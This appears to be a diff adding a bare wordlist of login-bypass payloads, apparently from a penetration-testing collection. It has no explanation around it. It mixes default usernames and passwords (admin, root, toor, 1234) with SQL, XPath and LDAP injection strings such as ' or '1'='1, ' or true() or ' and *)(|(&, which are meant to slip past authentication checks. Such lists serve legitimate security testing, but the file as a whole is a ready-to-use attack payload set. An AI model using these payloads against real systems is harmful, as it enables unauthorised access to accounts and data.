@@ -1,0 +1,59 @@
+admin
+password
+1234
+123456
+root
+toor
+test
+guest
+' or '1'='1
+' or ''='
+' or 1]%00
+' or /* or '
+' or "a" or '
+' or 1 or '
+' or true() or '
+'or string-length(name(.))<10 or'
+'or contains(name,'adm') or'
+'or contains(.,'adm') or'
+'or position()=2 or'
+admin' or '
+admin' or '1'='2
+*
+*)(&
+*)(|(&
+pwd)
+*)(|(*
+*))%00
+admin)(&)
+pwd
+admin)(!(&(|
+pwd))
+admin))(|(|
+1234
+'-'
+' '
+'&'
+'^'
+'*'
+' or ''-'
+' or '' '
+' or ''&'
+' or ''^'
+' or ''*'
+"-"
+" "
+"&"
+"^"
+"*"
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+or true--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
